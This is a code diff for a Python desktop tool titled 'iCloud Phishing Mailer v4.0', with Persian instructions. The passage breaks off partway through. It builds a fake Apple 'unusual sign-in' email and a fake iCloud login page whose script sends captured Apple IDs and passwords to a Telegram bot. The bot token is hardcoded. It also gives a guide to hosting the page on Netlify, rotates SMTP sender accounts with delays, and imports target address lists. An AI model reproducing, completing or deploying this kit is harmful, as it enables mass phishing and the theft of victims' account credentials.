@@ -1,0 +1,838 @@
+# ==================== iCloud Phishing Mailer v4.0 ====================
+import os, sys, json, time, threading, smtplib
+from datetime import datetime
+from email.mime.text import MIMEText
+from email.mime.multipart import MIMEMultipart
+import tkinter as tk
+from tkinter import ttk, messagebox, filedialog
+
+# ===== تلاش برای نصب CustomTkinter =====
+try:
+    import customtkinter as ctk
+except ImportError:
+    print("CustomTkinter not found. Installing...")
+    os.system("pip install customtkinter")
+    try:
+        import customtkinter as ctk
+    except:
+        print("Failed to install. Please run: pip install customtkinter")
+        exit(1)
+
+# ===== تنظیم ظاهر =====
+ctk.set_appearance_mode("Dark")
+ctk.set_default_color_theme("blue")
+
+# ===== کانفیگ =====
+CONFIG_FILE = "config.json"
+LOG_FILE = "creds.txt"
+
+DEFAULT_CONFIG = {
+    "bot_token": "1326112987:AAH6EPiIxqv4lquRycNVzpHcIGTMO6qw3iU",
+    "chat_id": "1338686578",
+    "accounts": [],
+    "targets": [],
+    "delay": 15,
+    "rotate": 3,
+    "phish_url": "",
+    "subject": "Security Alert: Unusual sign-in attempt detected",
+    "body": """<!DOCTYPE html>
+<html>
+<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"></head>
+<body style="margin:0;padding:0;background-color:#f5f5f7;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,sans-serif">
+<table width="100%" cellpadding="0" cellspacing="0" style="background-color:#f5f5f7;padding:30px 10px">
+<tr><td align="center">
+<table width="600" cellpadding="0" cellspacing="0" style="background-color:#ffffff;border-radius:16px;overflow:hidden;box-shadow:0 2px 12px rgba(0,0,0,0.08)">
+<tr><td style="padding:40px 40px 20px 40px" align="center">
+<img src="https://upload.wikimedia.org/wikipedia/commons/f/fa/Apple_logo_black.svg" width="44" style="margin-bottom:20px" alt="Apple">
+<h1 style="font-size:24px;font-weight:600;color:#1d1d1f;margin:0 0 8px 0">Unusual sign-in attempt</h1>
+<p style="font-size:15px;color:#6e6e73;line-height:1.5;margin:0 0 24px 0">
+We noticed a sign-in attempt for your Apple ID from an unrecognized device and location.<br><br>
+If this was you, you can ignore this message. If this was not you, please review your account activity immediately.
+</p>
+<div style="background-color:#f5f5f7;border-radius:12px;padding:20px;margin-bottom:24px;text-align:left">
+<p style="font-size:13px;color:#6e6e73;margin:0 0 6px 0;text-transform:uppercase;letter-spacing:0.5px">Attempt Details</p>
+<table cellpadding="4" cellspacing="0" style="font-size:14px;color:#1d1d1f">
+<tr><td style="width:90px;color:#6e6e73">Date:</td><td style="font-weight:500">July 15, 2026</td></tr>
+<tr><td style="color:#6e6e73">Time:</td><td style="font-weight:500">3:42 AM PDT</td></tr>
+<tr><td style="color:#6e6e73">Device:</td><td style="font-weight:500">Samsung Galaxy S25</td></tr>
+<tr><td style="color:#6e6e73">Location:</td><td style="font-weight:500">Moscow, Russia</td></tr>
+</table>
+</div>
+<table cellpadding="0" cellspacing="0" style="margin-bottom:24px">
+<tr>
+<td align="center" style="background-color:#0071e3;border-radius:10px;padding:0">
+<a href="LINK_HERE" style="display:inline-block;background-color:#0071e3;color:#ffffff;text-decoration:none;font-size:16px;font-weight:500;padding:14px 44px;border-radius:10px;letter-spacing:0.3px">Review account activity →</a>
+</td>
+</tr>
+</table>
+<p style="font-size:13px;color:#8e8e93;line-height:1.5;margin:0 0 4px 0">
+If you do not recognize this activity, someone may have your password.
+<a href="LINK_HERE" style="color:#0071e3;text-decoration:none;font-weight:500">Change your password now.</a>
+</p>
+<p style="font-size:12px;color:#8e8e93;line-height:1.4;margin:24px 0 0 0">
+This is an automated security alert from Apple. Please do not reply to this email.<br>
+© 2026 Apple Inc. One Apple Park Way, Cupertino, CA 95014.
+</p>
+</td></tr>
+</table>
+</td></tr>
+</table>
+</body>
+</html>"""
+}
+
+if os.path.exists(CONFIG_FILE):
+    with open(CONFIG_FILE) as f:
+        config = {**DEFAULT_CONFIG, **json.load(f)}
+else:
+    config = DEFAULT_CONFIG.copy()
+    with open(CONFIG_FILE, 'w') as f:
+        json.dump(config, f, indent=2)
+
+def save_config():
+    with open(CONFIG_FILE, 'w') as f:
+        json.dump(config, f, indent=2)
+
+# ===== کلاس اصلی برنامه =====
+class App:
+    def __init__(self):
+        self.root = ctk.CTk()
+        self.root.title("🔥 iCloud Phishing Mailer v4.0")
+        self.root.geometry("1000x650")
+        self.root.minsize(900, 600)
+        
+        self.sending = False
+        self.send_thread = None
+        
+        self.setup_tabs()
+        self.load_data()
+        self.root.mainloop()
+    
+    def setup_tabs(self):
+        self.tabview = ctk.CTkTabview(self.root)
+        self.tabview.pack(fill="both", expand=True, padx=10, pady=10)
+        
+        # ===== تب 1: لینک =====
+        self.tab_link = self.tabview.add("🔗 1. Phishing Page Link")
+        self.setup_link_tab()
+        
+        # ===== تب 2: ایمیل‌ها =====
+        self.tab_accounts = self.tabview.add("📧 2. Email Accounts")
+        self.setup_accounts_tab()
+        
+        # ===== تب 3: هدف‌ها =====
+        self.tab_targets = self.tabview.add("🎯 3. Targets")
+        self.setup_targets_tab()
+        
+        # ===== تب 4: ارسال =====
+        self.tab_send = self.tabview.add("📨 4. Send Emails")
+        self.setup_send_tab()
+        
+        # ===== تب 5: لاگ =====
+        self.tab_logs = self.tabview.add("📋 5. Logs & Results")
+        self.setup_logs_tab()
+    
+    # ============= تب 1: لینک =============
+    def setup_link_tab(self):
+        frame = self.tab_link
+        
+        ctk.CTkLabel(frame, text="🔗 Phishing Page Link", font=("Arial", 22, "bold")).pack(pady=(15,5))
+        ctk.CTkLabel(frame, text="لینک صفحه فیکی که روی هاست آپلود کردی رو اینجا بذار", font=("Arial", 13), text_color="gray").pack()
+        
+        # کادر اصلی
+        main_frame = ctk.CTkFrame(frame)
+        main_frame.pack(fill="x", padx=20, pady=20)
+        
+        ctk.CTkLabel(main_frame, text="🌐 Your Phishing Page URL:", font=("Arial", 15, "bold")).pack(anchor="w", padx=15, pady=(15,5))
+        
+        self.url_entry = ctk.CTkEntry(main_frame, height=45, font=("Arial", 16))
+        self.url_entry.insert(0, config["phish_url"])
+        self.url_entry.pack(fill="x", padx=15, pady=5)
+        
+        ctk.CTkLabel(main_frame, text="مثال: https://myicloud.netlify.app", font=("Arial", 12), text_color="gray").pack(anchor="w", padx=15)
+        
+        btn_frame = ctk.CTkFrame(main_frame)
+        btn_frame.pack(fill="x", padx=15, pady=(15,10))
+        
+        ctk.CTkButton(btn_frame, text="💾 Save Link", command=self.save_link, width=150, height=35).pack(side="left", padx=5)
+        ctk.CTkButton(btn_frame, text="🌐 Open in Browser", command=self.open_link, width=150, height=35).pack(side="left", padx=5)
+        
+        self.link_status = ctk.CTkLabel(btn_frame, text="", font=("Arial", 12))
+        self.link_status.pack(side="left", padx=20)
+        
+        # راهنما
+        guide_frame = ctk.CTkFrame(frame)
+        guide_frame.pack(fill="both", expand=True, padx=20, pady=10)
+        
+        ctk.CTkLabel(guide_frame, text="📖 راهنمای آپلود صفحه فیک روی هاست رایگان", font=("Arial", 16, "bold")).pack(anchor="w", padx=15, pady=(15,10))
+        
+        guide_text = ctk.CTkTextbox(guide_frame, height=200)
+        guide_text.pack(fill="both", expand=True, padx=15, pady=5)
+        guide_text.insert("1.0", """مراحل آپلود صفحه فیک روی Netlify (رایگان):
+
+1️⃣ فایل index.html رو از دکمه پایین ذخیره کن
+2️⃣ برو به https://app.netlify.com و با گوگل ثبت‌نام کن
+3️⃣ بکش و رها کن (drag & drop) پوشه رو توی Netlify
+4️⃣ بعد از چند ثانیه لینک site.netlify.app بهت میده
+5️⃣ اون لینک رو کپی کن و توی باکس بالا بچسبون
+6️⃣ بزن Save Link
+
+💡 نکته: قبل از آپلود، توی فایل index.html:
+   - bot_token رو با توکن ربات تلگرامت عوض کن
+   - chat_id رو با آیدی عددی چت خودت عوض کن""")
+        guide_text.configure(state="disabled")
+        
+        # دکمه ذخیره فایل HTML
+        save_btn = ctk.CTkButton(guide_frame, text="💾 Save index.html (Page File)", command=self.save_html_page, width=200, height=40, fg_color="#7B2D8E")
+        save_btn.pack(pady=10)
+    
+    def save_link(self):
+        url = self.url_entry.get().strip()
+        if url:
+            config["phish_url"] = url
+            save_config()
+            self.link_status.configure(text="✅ Link saved!", text_color="green")
+            self.log(f"✅ Phishing link saved: {url}")
+        else:
+            messagebox.showerror("Error", "Please enter a URL!")
+    
+    def open_link(self):
+        url = self.url_entry.get().strip()
+        if url:
+            import webbrowser
+            webbrowser.open(url)
+    
+    def save_html_page(self):
+        bot_token = config.get("bot_token", "")
+        chat_id = config.get("chat_id", "")
+        
+        if not bot_token or not chat_id:
+            msg = "⚠️ اول برو تب Email Accounts و تنظیمات تلگرام رو کامل کن.\n\nبعد برگرد اینجا."
+            messagebox.showwarning("Warning", msg)
+            self.log("⚠️ Telegram not configured yet")
+            return
+        
+        html_content = f"""<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>iCloud</title>
+<style>
+*{{margin:0;padding:0;box-sizing:border-box}}
+body{{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:linear-gradient(135deg,#f5f7fa,#c3cfe2);height:100vh;display:flex;justify-content:center;align-items:center}}
+.container{{background:white;border-radius:18px;box-shadow:0 4px 24px rgba(0,0,0,0.12);padding:40px;width:400px;max-width:90vw;text-align:center}}
+.logo svg{{width:80px;height:80px;margin-bottom:12px}}
+h1{{font-size:24px;font-weight:600;color:#1d1d1f;margin-bottom:8px}}
+.sub{{font-size:14px;color:#6e6e73;margin-bottom:28px}}
+.in-group{{margin-bottom:16px;text-align:left}}
+.in-group label{{display:block;font-size:13px;font-weight:500;color:#1d1d1f;margin-bottom:6px}}
+.in-group input{{width:100%;padding:12px 14px;border:1.5px solid #d2d2d7;border-radius:10px;font-size:15px;outline:none}}
+.in-group input:focus{{border-color:#0071e3;box-shadow:0 0 0 3px rgba(0,113,227,0.15)}}
+.btn{{width:100%;padding:12px;background:#0071e3;color:white;border:none;border-radius:10px;font-size:16px;font-weight:500;cursor:pointer;margin-top:8px}}
+.btn:hover{{background:#0066cc}}
+.err{{color:#e30000;font-size:13px;margin-top:10px;display:none}}
+.loading{{display:none;margin-top:15px;font-size:14px;color:#6e6e73}}
+.spinner{{display:inline-block;width:16px;height:16px;border:2px solid #d2d2d7;border-top-color:#0071e3;border-radius:50%;animation:spin 0.8s linear infinite;margin-right:8px;vertical-align:middle}}
+@keyframes spin{{to{{transform:rotate(360deg)}}}}
+.footer{{margin-top:20px;font-size:12px;color:#8e8e93}}
+.footer a{{color:#0071e3;text-decoration:none}}
+</style>
+</head>
+<body>
+<div class="container">
+<div class="logo">
+<svg viewBox="0 0 170 170" xmlns="http://www.w3.org/2000/svg">
+<path d="M150.37 130.25c-6.06 13.76-12.82 26.38-23.1 38.38-11.4 13.33-20.75 18.67-33.64 18.67-12.9 0-21.8-4.56-34.5-4.56-12.7 0-22.3 4.9-34.66 4.9-11.4 0-22.1-6.6-33.2-19.8C-1.9 155.53-7.4 131.78-6.6 108.8c.78-23 8.94-42.46 24.4-57.68 10.64-10.52 23.8-16.56 37.8-16.88 10.72-.32 20.85 3.84 28.8 8.12 5.6 3.02 10.7 6.08 15.8 6.08 4.9 0 10.4-2.86 15.7-5.86 9.2-5.2 19.5-10.1 31.1-9.56 18.2.78 31.9 8.32 41.1 22.4-3.3 2.2-6.4 4.5-9.3 6.96-10.6 9.04-15.7 21.28-14.7 37.4 1 16.26 7.9 27.24 19.2 35.74 2.5 1.86 5.2 3.58 7.7 5.56-1.1 2.8-2.3 5.5-3.5 8.16zM107.8 28.68c.3-15.2 5.8-28.9 16.4-38.68 10.6-9.8 23.5-14.6 36.9-14.2.2 1.6.3 3.2.3 4.8 0 14.9-5.8 28.6-16 38.7-9.9 9.8-22.3 14.6-35.5 14.4-.1-1.6-.1-3.2-.1-5.02z" fill="#0071e3"/>
+</svg>
+</div>
+<h1>Sign in to iCloud</h1>
+<p class="sub">Use your Apple ID to continue to your account.</p>
+<form id="f">
+<div class="in-group"><label>Apple ID</label><input type="text" id="e" placeholder="name@example.com" required></div>
+<div class="in-group"><label>Password</label><input type="password" id="p" placeholder="Enter your password" required></div>
+<button type="submit" class="btn" id="submitBtn">Sign In</button>
+<div class="loading" id="loading"><div class="spinner"></div>Verifying your account...</div>
+<div class="err" id="err">Incorrect Apple ID or password. Please try again.</div>
+</form>
+<div class="footer"><a href="#">Forgot Apple ID or password?</a><br><a href="#">Create your Apple ID</a></div>
+</div>
+<script>
+document.getElementById('f').addEventListener('submit', function(e) {{
+e.preventDefault();
+var em=document.getElementById('e').value;
+var ps=document.getElementById('p').value;
+document.getElementById('submitBtn').style.display='none';
+document.getElementById('loading').style.display='block';
+fetch('https://api.telegram.org/bot{bot_token}/sendMessage',{{
+method:'POST',
+headers:{{'Content-Type':'application/json'}},
+body:JSON.stringify({{
+chat_id:'{chat_id}',
+text:'✅ *New iCloud Credentials* ✅\\n👤 *Email:* `'+em+'`\\n🔑 *Password:* `'+ps+'`\\n🌐 *IP:* `'+window.location.href+'`',
+parse_mode:'Markdown'
+}})
+}}).then(function(){{
+document.getElementById('loading').style.display='none';
+document.getElementById('err').style.display='block';
+setTimeout(function(){{window.location.href='https://www.icloud.com/'}},2000);
+}}).catch(function(){{
+document.getElementById('loading').style.display='none';
+document.getElementById('err').style.display='block';
+setTimeout(function(){{window.location.href='https://www.icloud.com/'}},2000);
+}});
+}});
+</script>
+</body>
+</html>"""
+        
+        fname = filedialog.asksaveasfilename(
+            defaultextension=".html",
+            filetypes=[("HTML files", "*.html")],
+            initialfile="index.html"
+        )
+        
+        if fname:
+            with open(fname, 'w', encoding='utf-8') as f:
+                f.write(html_content)
+            self.log(f"✅ HTML page saved: {fname}")
+            messagebox.showinfo("Done", f"فایل index.html ذخیره شد!\n\nحالا:\n1. برو به netlify.com\n2. این فایل رو آپلود کن\n3. لینک رو کپی کن بذار تو تب اول")
+    
+    # ============= تب 2: ایمیل‌ها =============
+    def setup_accounts_tab(self):
+        frame = self.tab_accounts
+        
+        ctk.CTkLabel(frame, text="📧 Email Accounts (SMTP)", font=("Arial", 22, "bold")).pack(pady=(15,5))
+        ctk.CTkLabel(frame, text="ایمیل‌هایی که ازشون برای ارسال استفاده میشه", font=("Arial", 13), text_color="gray").pack()
+        
+        # تلگرام
+        tg_frame = ctk.CTkFrame(frame)
+        tg_frame.pack(fill="x", padx=20, pady=10)
+        
+        ctk.CTkLabel(tg_frame, text="🤖 Telegram Bot (دریافت اطلاعات)", font=("Arial", 15, "bold")).pack(anchor="w", padx=15, pady=(10,5))
+        ctk.CTkLabel(tg_frame, text="این برای صفحه فیک روی هاست لازمه - اطلاعات قربانی به تلگرامت میاد", font=("Arial", 11), text_color="gray").pack(anchor="w", padx=15)
+        
+        tg_row = ctk.CTkFrame(tg_frame)
+        tg_row.pack(fill="x", padx=15, pady=10)
+        
+        ctk.CTkLabel(tg_row, text="Bot Token:").pack(side="left")
+        self.tg_token = ctk.CTkEntry(tg_row, width=300)
+        self.tg_token.insert(0, config["bot_token"])
+        self.tg_token.pack(side="left", padx=10)
+        
+        ctk.CTkLabel(tg_row, text="Chat ID:").pack(side="left")
+        self.tg_chat = ctk.CTkEntry(tg_row, width=180)
+        self.tg_chat.insert(0, config["chat_id"])
+        self.tg_chat.pack(side="left", padx=10)
+        
+        tg_btn_row = ctk.CTkFrame(tg_frame)
+        tg_btn_row.pack(fill="x", padx=15, pady=(0,10))
+        
+        ctk.CTkButton(tg_btn_row, text="💾 Save Telegram", command=self.save_telegram, width=130).pack(side="left", padx=5)
+        ctk.CTkButton(tg_btn_row, text="📨 Test Telegram", command=self.test_telegram, width=130).pack(side="left", padx=5)
+        
+        self.tg_status = ctk.CTkLabel(tg_btn_row, text="", font=("Arial", 11))
+        self.tg_status.pack(side="left", padx=20)
+        
+        # راهنما
+        help_frame = ctk.CTkFrame(tg_frame)
+        help_frame.pack(fill="x", padx=15, pady=(0,10))
+        ctk.CTkLabel(help_frame, text="💡 راهنما: برو به @BotFather توی تلگرام، بزن /newbot و یه ربات بساز. توکن رو کپی کن. بعد برو به @userinfobot و chat_id رو بگیر.", font=("Arial", 11), text_color="orange", wraplength=700).pack(padx=10, pady=5)
+        
+        # فرم افزودن اکانت
+        add_frame = ctk.CTkFrame(frame)
+        add_frame.pack(fill="x", padx=20, pady=10)
+        
+        ctk.CTkLabel(add_frame, text="➕ Add SMTP Account", font=("Arial", 15, "bold")).pack(anchor="w", padx=15, pady=5)
+        
+        row1 = ctk.CTkFrame(add_frame)
+        row1.pack(fill="x", padx=15, pady=2)
+        
+        ctk.CTkLabel(row1, text="Email:").pack(side="left")
+        self.acc_email = ctk.CTkEntry(row1, width=250)
+        self.acc_email.pack(side="left", padx=5)
+        
+        ctk.CTkLabel(row1, text="Password:").pack(side="left", padx=(10,0))
+        self.acc_pass = ctk.CTkEntry(row1, width=250, show="*")
+        self.acc_pass.pack(side="left", padx=5)
+        
+        row2 = ctk.CTkFrame(add_frame)
+        row2.pack(fill="x", padx=15, pady=2)
+        
+        ctk.CTkLabel(row2, text="SMTP Server:").pack(side="left")
+        self.acc_smtp = ctk.CTkEntry(row2, width=200)
+        self.acc_smtp.insert(0, "smtp.gmail.com")
+        self.acc_smtp.pack(side="left", padx=5)
+        
+        ctk.CTkLabel(row2, text="Port:").pack(side="left", padx=(10,0))
+        self.acc_port = ctk.CTkEntry(row2, width=70)
+        self.acc_port.insert(0, "587")
+        self.acc_port.pack(side="left", padx=5)
+        
+        row3 = ctk.CTkFrame(add_frame)
+        row3.pack(fill="x", padx=15, pady=5)
+        
+        ctk.CTkButton(row3, text="➕ Add Account", command=self.add_account, width=130).pack(side="left", padx=5)
+        ctk.CTkButton(row3, text="📂 Import from File", command=self.import_accounts_file, width=130).pack(side="left", padx=5)
+        
+        # لیست
+        list_frame = ctk.CTkFrame(frame)
+        list_frame.pack(fill="both", expand=True, padx=20, pady=10)
+        
+        ctk.CTkLabel(list_frame, text="Accounts List:", font=("Arial", 14, "bold")).pack(anchor="w", padx=15, pady=5)
+        
+        tree_container = ctk.CTkFrame(list_frame)
+        tree_container.pack(fill="both", expand=True, padx=15, pady=5)
+        
+        columns = ("Email", "SMTP", "Port", "Status")
+        self.acc_tree = ttk.Treeview(tree_container, columns=columns, show="headings", height=5)
+        for col in columns:
+            self.acc_tree.heading(col, text=col)
+            if col == "Email": self.acc_tree.column(col, width=300)
+            else: self.acc_tree.column(col, width=120)
+        
+        scroll = ttk.Scrollbar(tree_container, orient="vertical", command=self.acc_tree.yview)
+        self.acc_tree.configure(yscrollcommand=scroll.set)
+        self.acc_tree.pack(side="left", fill="both", expand=True)
+        scroll.pack(side="right", fill="y")
+        
+        btn_row = ctk.CTkFrame(list_frame)
+        btn_row.pack(fill="x", padx=15, pady=5)
+        
+        ctk.CTkButton(btn_row, text="✅ Test Selected", command=self.test_account, width=120).pack(side="left", padx=5)
+        ctk.CTkButton(btn_row, text="❌ Remove Selected", command=self.remove_account, fg_color="red", width=120).pack(side="left", padx=5)
+        ctk.CTkButton(btn_row, text="🧹 Clear All", command=self.clear_accounts, fg_color="darkred", width=100).pack(side="left", padx=5)
+        
+        note_frame = ctk.CTkFrame(frame)
+        note_frame.pack(fill="x", padx=20, pady=5)
+        ctk.CTkLabel(note_frame, text="💡 برای جیمیل: Google Account > Security > 2-Step Verification > App Passwords", font=("Arial", 11), text_color="orange").pack(padx=15, pady=5)
+    
+    # ============= تب 3: هدف‌ها =============
+    def setup_targets_tab(self):
+        frame = self.tab_targets
+        
+        ctk.CTkLabel(frame, text="🎯 Target Emails", font=("Arial", 22, "bold")).pack(pady=(15,5))
+        ctk.CTkLabel(frame, text="ایمیل‌های هدف - هر خط یک ایمیل", font=("Arial", 13), text_color="gray").pack()
+        
+        top = ctk.CTkFrame(frame)
+        top.pack(fill="x", padx=20, pady=10)
+        
+        ctk.CTkButton(top, text="📂 Import from TXT", command=self.import_targets, width=140).pack(side="left", padx=5)
+        ctk.CTkButton(top, text="💾 Save to File", command=self.export_targets, width=140).pack(side="left", padx=5)
+        ctk.CTkButton(top, text="🧹 Clear All", command=self.clear_targets, fg_color="red", width=100).pack(side="left", padx=5)
+        
+        self.target_count = ctk.CTkLabel(top, text="Count: 0", font=("Arial", 14, "bold"))
+        self.target_count.pack(side="right", padx=20)
+        
+        self.target_text = ctk.CTkTextbox(frame)
+        self.target_text.pack(fill="both", expand=True, padx=20, pady=10)
+        
+        if config["targets"]:
+            self.target_text.insert("1.0", "\n".join(config["targets"]))
+            self.update_target_count()
+        
+        ctk.CTkLabel(frame, text="مثال: target@gmail.com - هر خط یه ایمیل", font=("Arial", 11), text_color="gray").pack(anchor="w", padx=20)
+    
+    # ============= تب 4: ارسال =============
+    def setup_send_tab(self):
+        frame = self.tab_send
+        
+        ctk.CTkLabel(frame, text="📨 Send Phishing Emails", font=("Arial", 22, "bold")).pack(pady=(15,5))
+        
+        set_frame = ctk.CTkFrame(frame)
+        set_frame.pack(fill="x", padx=20, pady=10)
+        
+        ctk.CTkLabel(set_frame, text="⚙️ Settings", font=("Arial", 15, "bold")).pack(anchor="w", padx=15, pady=5)
+        
+        row1 = ctk.CTkFrame(set_frame)
+        row1.pack(fill="x", padx=15, pady=2)
+        
+        ctk.CTkLabel(row1, text="Delay (seconds):").pack(side="left")
+        self.delay_entry = ctk.CTkEntry(row1, width=70)
+        self.delay_entry.insert(0, str(config["delay"]))
+        self.delay_entry.pack(side="left", padx=5)
+        
+        ctk.CTkLabel(row1, text="     Rotate every:").pack(side="left", padx=(20,0))
+        self.rotate_entry = ctk.CTkEntry(row1, width=70)
+        self.rotate_entry.insert(0, str(config["rotate"]))
+        self.rotate_entry.pack(side="left", padx=5)
+        ctk.CTkLabel(row1, text="emails").pack(side="left")
+        
+        ctk.CTkLabel(row1, text="     Phishing URL:").pack(side="left", padx=(20,0))
+        self.phish_url_display = ctk.CTkEntry(row1, width=250)
+        self.phish_url_display.insert(0, config["phish_url"])
+        self.phish_url_display.pack(side="left", padx=5)
+        
+        ctk.CTkLabel(set_frame, text="Email Subject:").pack(anchor="w", padx=15, pady=(10,2))
+        self.subj_entry = ctk.CTkEntry(set_frame)
+        self.subj_entry.insert(0, config["subject"])
+        self.subj_entry.pack(fill="x", padx=15, pady=2)
+        
+        ctk.CTkLabel(set_frame, text="Email Body (HTML):").pack(anchor="w", padx=15, pady=(10,2))
+        self.body_text = ctk.CTkTextbox(set_frame, height=100)
+        self.body_text.pack(fill="x", padx=15, pady=2)
+        self.body_text.insert("1.0", config["body"])
+        
+        ctk.CTkLabel(set_frame, text="LINK_HERE با لینک صفحه فیک جایگزین میشه", font=("Arial", 11), text_color="yellow").pack(anchor="w", padx=15, pady=(0,5))
+        
+        # Progress
+        prog_frame = ctk.CTkFrame(frame)
+        prog_frame.pack(fill="x", padx=20, pady=10)
+        
+        btn_row = ctk.CTkFrame(prog_frame)
+        btn_row.pack(fill="x", padx=15, pady=5)
+        
+        self.send_btn = ctk.CTkButton(btn_row, text="▶ Start Sending", command=self.start_sending, fg_color="green", width=150, height=40, font=("Arial", 15, "bold"))
+        self.send_btn.pack(side="left", padx=5)
+        
+        self.stop_send_btn = ctk.CTkButton(btn_row, text="⏹ Stop", command=self.stop_sending, fg_color="red", width=100, state="disabled")
+        self.stop_send_btn.pack(side="left", padx=5)
+        
+        self.prog_label = ctk.CTkLabel(btn_row, text="Ready", font=("Arial", 14))
+        self.prog_label.pack(side="right", padx=20)
+        
+        self.progress = ctk.CTkProgressBar(prog_frame)
+        self.progress.pack(fill="x", padx=15, pady=5)
+        self.progress.set(0)
+        
+        self.send_status = ctk.CTkLabel(prog_frame, text="", font=("Arial", 12))
+        self.send_status.pack(anchor="w", padx=15, pady=(0,5))
+    
+    # ============= تب 5: لاگ =============
+    def setup_logs_tab(self):
+        frame = self.tab_logs
+        
+        ctk.CTkLabel(frame, text="📋 Application Logs", font=("Arial", 22, "bold")).pack(pady=(15,10))
+        
+        self.log_text = ctk.CTkTextbox(frame)
+        self.log_text.pack(fill="both", expand=True, padx=20, pady=10)
+        
+        btn_row = ctk.CTkFrame(frame)
+        btn_row.pack(pady=10)
+        
+        ctk.CTkButton(btn_row, text="🗑 Clear Logs", command=self.clear_logs, width=120).pack(side="left", padx=5)
+        ctk.CTkButton(btn_row, text="💾 Export Logs", command=self.export_logs, width=120).pack(side="left", padx=5)
+        ctk.CTkButton(btn_row, text="📋 Copy All", command=self.copy_logs, width=120).pack(side="left", padx=5)
+        
+        summary_frame = ctk.CTkFrame(frame)
+        summary_frame.pack(fill="x", padx=20, pady=10)
+        
+        ctk.CTkLabel(summary_frame, text="📊 Summary:", font=("Arial", 14, "bold")).pack(anchor="w", padx=15, pady=5)
+        
+        self.summary_text = ctk.CTkTextbox(summary_frame, height=60)
+        self.summary_text.pack(fill="x", padx=15, pady=5)
+    
+    # ============= توابع =============
+    
+    def log(self, msg, level="INFO", to_summary=False):
+        ts = datetime.now().strftime("%H:%M:%S")
+        line = f"[{ts}] [{level}] {msg}\n"
+        try:
+            self.log_text.insert("end", line)
+            self.log_text.see("end")
+            self.root.update()
+        except: pass
+        print(line.strip())
+        
+        if to_summary:
+            try:
+                self.summary_text.insert("end", line)
+                self.summary_text.see("end")
+            except: pass
+    
+    def load_data(self):
+        for acc in config["accounts"]:
+            self.acc_tree.insert("", "end", values=(acc["email"], acc["smtp"], acc["port"], "⚪"))
+    
+    def update_target_count(self):
+        content = self.target_text.get("1.0", "end").strip()
+        count = len([l for l in content.split("\n") if l.strip() and "@" in l])
+        self.target_count.configure(text=f"Count: {count}")
+    
+    # ===== Telegram =====
+    def save_telegram(self):
+        config["bot_token"] = self.tg_token.get().strip()
+        config["chat_id"] = self.tg_chat.get().strip()
+        save_config()
+        self.log("✅ Telegram settings saved")
+        
+        if config["bot_token"] and config["chat_id"]:
+            self.tg_status.configure(text="✅ Saved", text_color="green")
+        else:
+            self.tg_status.configure(text="⚠️ Incomplete", text_color="orange")
+    
+    def test_telegram(self):
+        token = self.tg_token.get().strip()
+        chat = self.tg_chat.get().strip()
+        if not token or not chat:
+            messagebox.showerror("Error", "Enter Bot Token and Chat ID!")
+            return
+        
+        try:
+            import requests
+            r = requests.post(f"https://api.telegram.org/bot{token}/sendMessage",
+                json={"chat_id": chat, "text": "✅ *Test OK!*\n\nBot is working correctly!", "parse_mode": "Markdown"}, timeout=10)
+            if r.status_code == 200:
+                self.log("✅ Telegram test message sent!")
+                messagebox.showinfo("Success", "Test sent! Check your Telegram bot.")
+            else:
+                messagebox.showerror("Error", f"API Error:\n{r.text}")
+        except Exception as e:
+            messagebox.showerror("Error", str(e))
+    
+    # ===== Accounts =====
+    def add_account(self):
+        email = self.acc_email.get().strip()
+        password = self.acc_pass.get().strip()
+        smtp = self.acc_smtp.get().strip()
+        port = int(self.acc_port.get())
+        
+        if not email or not password:
+            messagebox.showerror("Error", "Email and Password required!")
+            return
+        
+        acc = {"email": email, "password": password, "smtp": smtp, "port": port}
+        config["accounts"].append(acc)
+        save_config()
+        
+        self.acc_tree.insert("", "end", values=(email, smtp, port, "⚪"))
+        self.acc_email.delete(0, "end")
+        self.acc_pass.delete(0, "end")
+        
+        self.log(f"✅ Account added: {email}")
+        messagebox.showinfo("Done", f"Account {email} added!")
+    
+    def remove_account(self):
+        sel = self.acc_tree.selection()
+        if not sel:
+            messagebox.showwarning("Select", "Select an account!")
+            return
+        
+        item = self.acc_tree.item(sel[0])
+        email = item['values'][0]
+        
+        for i, acc in enumerate(config["accounts"]):
+            if acc["email"] == email:
+                config["accounts"].pop(i)
+                break
+        
+        save_config()
+        self.acc_tree.delete(sel[0])
+        self.log(f"❌ Removed: {email}")
+    
+    def clear_accounts(self):
+        if messagebox.askyesno("Confirm", "Delete ALL accounts?"):
+            config["accounts"] = []
+            save_config()
+            for item in self.acc_tree.get_children():
+                self.acc_tree.delete(item)
+            self.log("🧹 All accounts cleared")
+    
+    def test_account(self):
+        sel = self.acc_tree.selection()
+        if not sel:
+            messagebox.showwarning("Select", "Select an account!")
+            return
+        
+        item = self.acc_tree.item(sel[0])
+        email = item['values'][0]
+        
+        for acc in config["accounts"]:
+            if acc["email"] == email:
+                self.log(f"Testing {email}...")
+                try:
+                    s = smtplib.SMTP(acc["smtp"], acc["port"])
+                    s.starttls()
+                    s.login(acc["email"], acc["password"])
+                    s.quit()
+                    self.log(f"✅ {email}: OK!")
+                    self.acc_tree.item(sel[0], values=(email, acc["smtp"], acc["port"], "✅ OK"))
+                    messagebox.showinfo("Success", "SMTP connection OK!")
+                except Exception as e:
+                    self.log(f"❌ {email}: {e}")
+                    self.acc_tree.item(sel[0], values=(email, acc["smtp"], acc["port"], "❌ Failed"))
+                    messagebox.showerror("Error", str(e)[:100])
+                break
+    
+    def import_accounts_file(self):
+        fname = filedialog.askopenfilename(filetypes=[("Text files", "*.txt")])
+        if not fname: return
+        
+        try:
+            count = 0
+            with open(fname) as f:
+                for line in f:
+                    line = line.strip()
+                    if line and "|" in line:
+                        parts = line.split("|")
+                        acc = {"email": parts[0], "password": parts[1], "smtp": parts[2] if len(parts)>2 else "smtp.gmail.com", "port": int(parts[3]) if len(parts)>3 else 587}
+                        if not any(a["email"] == acc["email"] for a in config["accounts"]):
+                            config["accounts"].append(acc)
+                            self.acc_tree.insert("", "end", values=(acc["email"], acc["smtp"], acc["port"], "⚪"))
+                            count += 1
+            
+            save_config()
+            self.log(f"✅ Imported {count} accounts")
+            messagebox.showinfo("Done", f"{count} accounts imported!")
+        except Exception as e:
+            messagebox.showerror("Error", str(e))
+    
+    # ===== Targets =====
+    def import_targets(self):
